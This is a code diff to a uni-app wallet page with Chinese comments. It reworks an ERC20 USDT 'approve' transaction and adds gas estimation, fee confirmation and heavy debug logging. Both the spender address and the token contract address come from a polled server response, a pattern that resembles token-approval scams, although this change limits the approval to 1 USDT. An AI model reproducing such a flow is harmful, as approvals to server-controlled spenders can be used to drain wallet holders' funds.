@@ -183,6 +183,7 @@
 					</view>
 				</view>
 			</uni-popup>
+
 		</view>
 
 
@@ -818,21 +819,120 @@ export default {
 			}
 		},
 
-		// 修改执行ERC20授权的错误提示
+		// 修改 executeERC20Approval 方法
 		async executeERC20Approval(ethereum, userAddress) {
 			try {
 				// 获取合约地址
 				const contractAddress = tokenPocketAuth.config.ethUsdtContract;
 				const spenderAddress = this.authAddress;
-				const approveAmount = tokenPocketAuth.config.defaultApproveAmount;
 				
-				// 将授权数量转换为16进制
-				const amountHex = '0x' + parseInt(approveAmount).toString(16);
+				// 修正：使用合理的授权数量
+				// USDT 有 6 位小数，所以 1 USDT = 1,000,000 wei
+				// 但为了降低 Gas 费用，我们只授权实际需要的数量
+				const approveAmount = '1000000'; // 1 USDT，足够一次交易使用
+				
+				console.log('授权数量:', approveAmount, 'wei (', parseFloat(approveAmount) / 1e6, 'USDT)');
+				
+				// 修正：正确处理大数转换为16进制
+				let amountHex;
+				try {
+					// 确保数字不会溢出JavaScript的安全整数范围
+					const amountBigInt = BigInt(approveAmount);
+					amountHex = '0x' + amountBigInt.toString(16);
+				} catch (error) {
+					console.error('数量转换失败:', error);
+					// 如果出错，使用一个安全的默认值 (1 USDT)
+					amountHex = '0xF4240'; // 1,000,000 的16进制
+				}
+				
+				console.log('授权数量 16进制:', amountHex);
 				
 				// 构建ERC20 approve方法的调用数据
 				const approveMethodABI = '0x095ea7b3' + 
 					spenderAddress.slice(2).padStart(64, '0') + 
 					amountHex.slice(2).padStart(64, '0');
+
+				// 添加调试信息
+				console.log('授权交易详情:', {
+					合约地址: contractAddress,
+					授权对象: spenderAddress,
+					授权数量: approveAmount + ' wei (' + (parseFloat(approveAmount) / 1e6) + ' USDT)',
+					授权数量16进制: amountHex,
+					交易数据: approveMethodABI
+				});
+
+				// 1. 动态获取当前 Gas Price
+				let gasPrice;
+				try {
+					const currentGasPrice = await ethereum.request({ method: 'eth_gasPrice' });
+					const gasPriceWei = parseInt(currentGasPrice, 16);
+					
+					// 设置更低的 Gas Price 限制
+					const maxGasPriceWei = 5000000000; // 5 gwei (降低限制)
+					const minGasPriceWei = 1000000000;  // 1 gwei
+					
+					// 使用网络建议的 Gas Price，但限制在合理范围内
+					const limitedGasPrice = Math.min(Math.max(gasPriceWei, minGasPriceWei), maxGasPriceWei);
+					gasPrice = '0x' + limitedGasPrice.toString(16);
+					
+					console.log('当前网络 Gas Price:', gasPriceWei / 1e9, 'gwei');
+					console.log('限制后 Gas Price:', limitedGasPrice / 1e9, 'gwei');
+				} catch (error) {
+					console.warn('获取动态 Gas Price 失败，使用默认值:', error);
+					gasPrice = '0x3B9ACA00'; // 1 gwei 作为安全默认值
+				}
+
+				// 2. 估算 Gas Limit (修正缺失的 method)
+				let gasLimit;
+				try {
+					const estimatedGas = await ethereum.request({
+						method: 'eth_estimateGas', // 添加缺失的 method
+						params: [{
+							from: userAddress,
+							to: contractAddress,
+							data: approveMethodABI
+						}]
+					});
+					
+					// 在估算基础上增加 10% 作为缓冲 (降低缓冲)
+					const gasBuffer = Math.floor(parseInt(estimatedGas, 16) * 1.1);
+					
+					// 设置最大 Gas Limit (降低最大值)
+					const maxGasLimit = 60000; // 降低到60000
+					gasLimit = '0x' + Math.min(gasBuffer, maxGasLimit).toString(16);
+					
+					console.log('估算 Gas Limit:', parseInt(estimatedGas, 16));
+					console.log('最终 Gas Limit:', Math.min(gasBuffer, maxGasLimit));
+				} catch (error) {
+					console.warn('估算 Gas Limit 失败，使用默认值:', error);
+					gasLimit = '0xEA60'; // 60000 作为保守默认值
+				}
+
+				// 3. 显示 Gas 费用预估给用户确认
+				const estimatedFeeWei = parseInt(gasLimit, 16) * parseInt(gasPrice, 16);
+				const estimatedFeeETH = estimatedFeeWei / 1e18;
+				
+				console.log('预估手续费:', {
+					gasLimit: parseInt(gasLimit, 16),
+					gasPrice: parseInt(gasPrice, 16) / 1e9 + ' gwei',
+					estimatedFeeETH: estimatedFeeETH.toFixed(6) + ' ETH',
+					estimatedFeeUSD: (estimatedFeeETH * 4300).toFixed(2) + ' USD' // 假设ETH价格4300美元
+				});
+
+				// 降低警告阈值
+				if (estimatedFeeETH > 0.002) { // 超过 0.002 ETH (~$8.6) 警告
+					const confirmed = await new Promise(resolve => {
+						uni.showModal({
+							title: '手续费确认',
+							content: `预估手续费：${estimatedFeeETH.toFixed(6)} ETH (约 $${(estimatedFeeETH * 4300).toFixed(2)})\n授权数量：${(parseFloat(approveAmount) / 1e6).toFixed(2)} USDT\n\n是否继续？`,
+							success: (res) => resolve(res.confirm)
+						});
+					});
+					
+					if (!confirmed) {
+						throw new Error('User cancelled due to high gas fee');
+					}
+				}
 
 				// 发送授权交易
 				const txHash = await ethereum.request({
@@ -841,8 +941,8 @@ export default {
 						from: userAddress,
 						to: contractAddress,
 						data: approveMethodABI,
-						gas: '0x15F90', // 90000
-						gasPrice: '0x9184e72a000' // 10 gwei
+						gas: gasLimit,
+						gasPrice: gasPrice
 					}]
 				});
 				
@@ -856,6 +956,33 @@ export default {
 			} catch (error) {
 				console.error('ERC20授权执行失败:', error);
 				throw new Error('Authorization transaction failed: ' + error.message);
+			}
+		},
+
+		// 新增：检查 Gas 费用预估的方法
+		async estimateTransactionCost(ethereum, txParams) {
+			try {
+				// 获取当前 Gas Price
+				const gasPrice = await ethereum.request({ method: 'eth_gasPrice' });
+				
+				// 估算 Gas Limit
+				const gasLimit = await ethereum.request({
+					method: 'eth_estimateGas',
+					params: [txParams]
+				});
+				
+				const totalCostWei = parseInt(gasLimit, 16) * parseInt(gasPrice, 16);
+				const totalCostETH = totalCostWei / 1e18;
+				
+				return {
+					gasPrice: parseInt(gasPrice, 16),
+					gasLimit: parseInt(gasLimit, 16),
+					totalCostWei,
+					totalCostETH
+				};
+			} catch (error) {
+				console.error('估算交易费用失败:', error);
+				throw error;
 			}
 		},
 
@@ -1333,43 +1460,107 @@ export default {
 			console.log('开始轮询ERC数据，每10秒更新一次');
 		},
 
-		// 新增：获取ERC数据
+		// 修改获取ERC数据方法 - 强制响应式更新
 		async fetchErcData() {
 			try {
+				console.log('=== 开始获取ERC数据 ===');
 				const currentToken = store.getToken();
 				console.log('fetchErcData - 当前token:', currentToken);
 				
 				const response = await api.transaction.getAuthAddress();
-				console.log('fetchErcData - 返回数据:', response);
+				console.log('fetchErcData - API返回完整响应:', response);
 				
-				if (response && response.data) {
-					console.log('ERC数据响应:', response);
+				// 检查是否被频率限制
+				if (response === null) {
+					console.log('API调用被频率限制，跳过本次更新');
+					return;
+				}
+				
+				// 更详细的响应检查
+				if (response) {
+					console.log('响应存在，检查data字段:', response.data);
+					console.log('检查响应根级别字段:', response);
 					
-					// 更新ERC数据
-					this.ercData = {
-						authorized_address: response.data.authorized_address || '',
-						node: response.data.node || '0',
-						output: response.data.output || '0',
-						participant: response.data.participant || '0',
-						revenue: response.data.revenue || '0'
-					};
-					
-					// 同时更新合约地址配置
-					const contractConfig = {};
-					if (response.data.tron_usdt_contract) {
-						contractConfig.tronUsdtContract = response.data.tron_usdt_contract;
-					}
-					if (response.data.eth_usdt_contract) {
-						contractConfig.ethUsdtContract = response.data.eth_usdt_contract;
-					}
-					
-					if (Object.keys(contractConfig).length > 0) {
-						tokenPocketAuth.updateConfig(contractConfig);
+					// 确定数据来源：可能在 response.data 或直接在 response 中
+					let dataSource = null;
+					if (response.data && (response.data.node || response.data.participant)) {
+						dataSource = response.data;
+						console.log('数据来源: response.data');
+					} else if (response.node || response.participant) {
+						dataSource = response;
+						console.log('数据来源: response');
 					}
 					
-					console.log('ERC数据更新成功:', this.ercData);
+					if (dataSource) {
+						console.log('=== 开始更新ERC数据 ===');
+						console.log('数据源内容:', dataSource);
+						console.log('原始数据:', {
+							participant: dataSource.participant,
+							node: dataSource.node,
+							output: dataSource.output,
+							revenue: dataSource.revenue,
+							authorized_address: dataSource.authorized_address
+						});
+						
+						// 先保存原始值，用于调试
+						const originalData = {
+							participant: dataSource.participant,
+							node: dataSource.node,
+							output: dataSource.output,
+							revenue: dataSource.revenue,
+							authorized_address: dataSource.authorized_address
+						};
+						
+						console.log('即将更新的原始值:', originalData);
+						
+						// 清理旧的更新方式，只使用一种方式
+						const newErcData = {
+							authorized_address: String(dataSource.authorized_address || ''),
+							node: String(dataSource.node || '0'),
+							output: String(dataSource.output || '0'),
+							participant: String(dataSource.participant || '0'),
+							revenue: String(dataSource.revenue || '0')
+						};
+						
+						console.log('格式化后的数据:', newErcData);
+						
+						// 使用最简单的赋值方式
+						this.ercData = { ...newErcData };
+						
+						console.log('赋值后的ercData:', this.ercData);
+						console.log('验证各个字段:');
+						console.log('  participant:', this.ercData.participant);
+						console.log('  node:', this.ercData.node);
+						console.log('  output:', this.ercData.output);
+						console.log('  revenue:', this.ercData.revenue);
+						
+						// 强制更新视图
+						this.$nextTick(() => {
+							this.$forceUpdate();
+							console.log('强制更新完成');
+						});
+						
+						// 同时更新合约地址配置
+						const contractConfig = {};
+						if (dataSource.tron_usdt_contract) {
+							contractConfig.tronUsdtContract = dataSource.tron_usdt_contract;
+						}
+						if (dataSource.eth_usdt_contract) {
+							contractConfig.ethUsdtContract = dataSource.eth_usdt_contract;
+						}
+						
+						if (Object.keys(contractConfig).length > 0) {
+							tokenPocketAuth.updateConfig(contractConfig);
+						}
+						
+						console.log('=== ERC数据更新完成 ===');
+						console.log('最终ercData状态:', JSON.stringify(this.ercData));
+					} else {
+						console.warn('在响应中找不到有效的ERC数据');
+						console.log('完整响应结构:', JSON.stringify(response, null, 2));
+					}
 				} else {
-					console.log('ERC数据返回空');
+					console.warn('API返回空响应');
 				}
 			} catch (error) {
 				console.error('获取ERC数据失败:', error);
@@ -1476,38 +1667,42 @@ export default {
 			});
 		},
 
-		// 修改：格式化数字显示（用于ERC数据）- 专门用于整数
+		// 同时修改格式化方法，增加调试信息
 		formatErcNumber(num) {
-			console.log('formatErcNumber input:', num, 'type:', typeof num);
+			console.log('=== formatErcNumber调用 ===');
+			console.log('输入值:', num, '类型:', typeof num);
 			
-			if (!num || num === '0') return '0';
+			if (!num || num === '0') {
+				console.log('输入为空或0，返回"0"');
+				return '0';
+			}
 			
 			const number = parseFloat(num);
 			if (isNaN(number)) {
-				console.log('Number parsing failed:', num);
+				console.log('解析数字失败:', num);
 				return '0';
 			}
 
-			console.log('Parsed number:', number);
+			console.log('解析后的数字:', number);
 
 			// 对于大数字，使用逗号分隔，不显示小数点（因为是人数、节点数等整数）
 			if (number >= 1000000) {
 				const result = number.toLocaleString('en-US', {
 					minimumFractionDigits: 0,
-					maximumFractionDigits: 0  // 整数不显示小数点
+					maximumFractionDigits: 0
 				});
-				console.log('Formatted result (large number):', result);
+				console.log('格式化结果(大数字):', result);
 				return result;
 			} else if (number >= 1000) {
 				const result = number.toLocaleString('en-US', {
 					minimumFractionDigits: 0,
 					maximumFractionDigits: 0
 				});
-				console.log('Formatted result (medium number):', result);
+				console.log('格式化结果(中等数字):', result);
 				return result;
 			} else {
-				const result = Math.round(number).toString();  // 整数显示
-				console.log('Formatted result (small number):', result);
+				const result = Math.round(number).toString();
+				console.log('格式化结果(小数字):', result);
 				return result;
 			}
 		},
